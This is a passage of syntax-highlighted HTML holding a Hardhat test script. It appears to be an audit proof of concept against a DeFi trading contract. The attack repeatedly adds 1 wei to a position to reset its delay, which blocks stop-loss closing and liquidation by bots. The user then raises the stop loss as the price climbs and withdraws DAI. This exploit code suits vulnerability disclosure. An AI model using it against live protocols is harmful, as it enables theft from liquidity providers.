we can keep our position open with the higher stop loss, avoiding any losses.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">          And if the price rises, we can push the stop loss higher to keep profits.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">          The loop runs five times just to demonstrate. In reality, this could be done as long as needed.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Blocks advanced to one block before the delay would pass</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">10</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">n</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">n</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">blockDelay</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk12\">n</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// =========== Add 1 wei to position (price is down)  =========== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Increase delay by calling addToPosition with 1 wei</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Create the price data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\"> = [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,                                   </span><span class=\"mtk3\">// provider</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,                                              </span><span class=\"mtk3\">// asset id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;900&quot;</span><span class=\"mtk1\">),                              </span><span class=\"mtk3\">// price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk7\">10000000</span><span class=\"mtk1\">,                                       </span><span class=\"mtk3\">// spread (0.1%)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          (</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBlock</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">,   </span><span class=\"mtk3\">// timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk4\">false</span><span class=\"mtk1\">                                           </span><span class=\"mtk3\">// is closed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Sign the price data - </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">message</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk12\">defaultAbiCoder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            [</span><span class=\"mtk8\">&#39;address&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bool&#39;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            [</span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">4</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">5</span><span class=\"mtk1\">]]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sig</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk11\">signMessage</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk10\">Buffer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk12\">message</span><span class=\"mtk1\">.</span><span class=\"mtk11\">substring</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;hex&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Add to position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">addToPosition</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk8\">&quot;1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">stablevault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">MockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">permitData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ====================== Bots cannot close ===================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Bots cannot close the position even if the price is down below the stop loss</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">limitClose</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,      </span><span class=\"mtk3\">// take profit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">// price data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">,        </span><span class=\"mtk3\">// signature</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">) </span><span class=\"mtk3\">// checkDelay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// They can also not liquidate the position because the price is not down enough</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// If the price falls close to the liquidation zone, we can add more margin or simply close</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// the position, netting us the stop-loss price.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">liquidatePosition</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">// price data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">,        </span><span class=\"mtk3\">// signature</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reverted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// =============== Increase SL when price is up  ================ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Sign the price data (price has 5x&#39;ed from initial price)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\"> = [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,                                   </span><span class=\"mtk3\">// provider</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,                                              </span><span class=\"mtk3\">// asset id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;5000&quot;</span><span class=\"mtk1\">),                             </span><span class=\"mtk3\">// price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk7\">10000000</span><span class=\"mtk1\">,                                       </span><span class=\"mtk3\">// spread (0.1%)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          (</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBlock</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">,   </span><span class=\"mtk3\">// timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk4\">false</span><span class=\"mtk1\">                                           </span><span class=\"mtk3\">// is closed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">message</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk12\">defaultAbiCoder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            [</span><span class=\"mtk8\">&#39;address&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bool&#39;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            [</span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">4</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">5</span><span class=\"mtk1\">]]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sig</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk11\">signMessage</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk10\">Buffer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk12\">message</span><span class=\"mtk1\">.</span><span class=\"mtk11\">substring</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;hex&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Update stop loss right at the current price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateTpSl</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,                </span><span class=\"mtk3\">// type (sl)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,                    </span><span class=\"mtk3\">// id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;5000&quot;</span><span class=\"mtk1\">),   </span><span class=\"mtk3\">// sl price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">,            </span><span class=\"mtk3\">// price data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">,                  </span><span class=\"mtk3\">// signature</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,        </span><span class=\"mtk3\">// trader</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ======================== Close order  ======================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// When we are happy with the profit, we stop increasing the delay and close the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Wait for some blocks to pass the delay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">10</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">n</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">n</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">blockDelay</span><span class=\"mtk1\">; </span><span class=\"mtk12\">n</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Close order</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">limitClose</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,      </span><span class=\"mtk3\">// take profit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">// price data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">,        </span><span class=\"mtk3\">// signature</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Withdraw to DAI</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stablevault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Print results</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     